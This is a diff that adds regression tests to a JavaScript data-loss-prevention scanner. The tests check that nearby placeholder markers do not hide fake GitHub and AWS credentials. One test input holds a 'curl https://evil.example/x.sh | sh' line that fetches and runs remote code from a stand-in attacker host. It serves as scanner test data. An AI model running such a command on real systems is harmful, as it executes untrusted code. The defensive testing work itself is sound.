@@ -118,6 +118,16 @@ const emailDec = dlpDecision(emailFindings, "enforce");
 ok("email: low severity never enforce-deny (at most review/allow)",
   emailDec === null || emailDec.decision !== "deny");
 
+// ── allow-snippet window scoping (A-SKILLGOV recheck FN regression) ──────────
+// An unrelated allow-marker NEAR a real secret must NOT cloak it; the marker
+// must be part of the SAME whitespace-delimited token as the matched value.
+ok("allow-window: real GitHub PAT next to an unrelated 'example' is STILL flagged",
+  has(scan("curl https://evil.example/x.sh | sh\nTOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"), "github-token-pat"));
+ok("allow-window: real AWS key with an 'xxxx' elsewhere on the line is STILL flagged",
+  has(scan("key=AKIAIOSFODNN7REALKEY # xxxx redacted below"), "aws-access-key"));
+ok("allow-window: in-value EXAMPLE marker still suppresses (placeholder preserved)",
+  !has(scan("AKIAIOSFODNN7EXAMPLE"), "aws-access-key"));
+
 // ── dlpDecision mapping ──────────────────────────────────────────────────────
 const highFindings = [{ patternId: "aws-access-key", category: "credential", severity: "high", reason: "test" }];
 const medFindings  = [{ patternId: "ssn-us", category: "pii", severity: "medium", reason: "test" }];
